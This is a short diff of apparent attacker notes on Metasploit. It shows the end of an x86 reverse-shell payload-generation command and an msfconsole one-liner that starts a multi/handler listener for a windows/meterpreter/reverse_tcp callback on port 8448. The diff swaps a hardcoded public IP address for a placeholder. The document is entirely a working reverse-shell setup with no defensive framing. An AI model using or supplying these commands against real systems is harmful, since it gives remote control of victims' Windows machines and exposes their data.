@@ -5,4 +5,4 @@ created x86 payload:
 	ead PrependSetuid=True > reverse
 	
 x86 listener:
-    msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 198.58.127.74; set lport 8448; exploit"
+    msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {IP ADDRESS}; set lport 8448; exploit"
